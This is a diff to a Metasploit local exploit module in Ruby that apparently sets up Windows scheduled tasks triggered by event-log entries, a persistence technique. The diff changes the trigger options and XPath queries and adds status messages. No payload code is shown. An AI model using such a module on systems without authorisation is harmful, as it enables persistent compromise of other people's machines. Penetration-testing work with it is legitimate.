@@ -1,5 +1,3 @@
-
-
 ##
 # ## This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
@@ -58,10 +56,10 @@ class Metasploit3 < Msf::Exploit::Local
 		register_advanced_options(
 			[
 				OptString.new('EVENT_LOG', [false, 'The event log to check for event','']),
-				OptString.new('PROVIDER', [false, 'The provider name assigned to the event','']),
+				#OptString.new('PROVIDER', [false, 'The provider name assigned to the event','']),
 				OptInt.new('EVENT_ID', [false, 'Event ID to trigger on.','']),
-				OptString.new('EVENTDATA_NAME', [false, '','']),
-				OptString.new('EVENTDATA_VALUE', [false, '','']),
+				OptString.new('EVENTDATA_NAME', [false, 'Data Name from tag with EventData','']),
+				OptString.new('EVENTDATA_VALUE', [false, 'Value of the Data Name','']),
 			], self.class)
 	end
 
@@ -73,11 +71,14 @@ class Metasploit3 < Msf::Exploit::Local
 		else
 			# If Vista/2008 or later add /R
 			if (sysinfo['OS'] =~ /Build [6-9]\d\d\d/)
+
+				######### FIX THIS SHIT ###########
 				res = cmd_exec("cmd.exe","/c gpresult /SCOPE COMPUTER /V")
 				if res =~ /DenyBatchLogonRight\s+Computer Setting:\s+Enabled/m
 					print_error("Logon as batch restricted, cannot run")
 					return
 				end
+				######### FIX THIS SHIT ###########
 			else
 				print_error("This module only works on Vista/2008 and above")
 				return
@@ -85,9 +86,9 @@ class Metasploit3 < Msf::Exploit::Local
 		end
 
 		if datastore['TRIGGER'] == "event"
-			if datastore['EVENT_LOG'].empty? or datastore['PROVIDER'].empty?
-				print_error("Advanced options EVENT_LOG, EVENT_ID, and PROVIDER required for event")
-				print_error("The properties under any event you wish to trigger on will contain this information")
+			if datastore['EVENT_LOG'].empty? or datastore['EVENT_ID'] == 0
+				print_error("Advanced options EVENT_LOG and EVENT_ID required for event")
+				print_error("The properties of any event in the event viewer will contain this information")
 				return
 			end
 		end
@@ -233,6 +234,7 @@ class Metasploit3 < Msf::Exploit::Local
 		case datastore['TRIGGER']
 			when 'logon'
 				# Trigger based on winlogon event, checks windows license key after logon
+				print_status("This trigger triggers on event 4101 which validates the Windows license")
 				line = "(EventID=4101) and *[System[Provider[@Name='Microsoft-Windows-Winlogon']]]"
 				xml = create_trigger_event_tags("Application", line, xml)
 
@@ -254,7 +256,12 @@ class Metasploit3 < Msf::Exploit::Local
 				xml = create_trigger_event_tags("Application", line, xml)
 
 			when 'event'
-				line = "(EventID=#{datastore['EVENT_ID']}) and *[System[Provider[@Name='#{datastore['PROVIDER']}']]]"
+				line = "*[System[(EventID=#{datastore['EVENT_ID']})]]"
+				if not datastore['EVENTDATA_NAME'].empty? and not datastore['EVENTDATA_VALUE'].empty?
+					line << " and *[EventData[(Data[@Name='#{datastore['EVENTDATA_NAME']}'] ='#{datastore['EVENTDATA_VALUE']}')]]"
+				end
+				vprint_status("\tPayload will trigger on #{line}")
+
 				xml = create_trigger_event_tags(datastore['EVENT_LOG'], line, xml)
 	
 			when 'version'
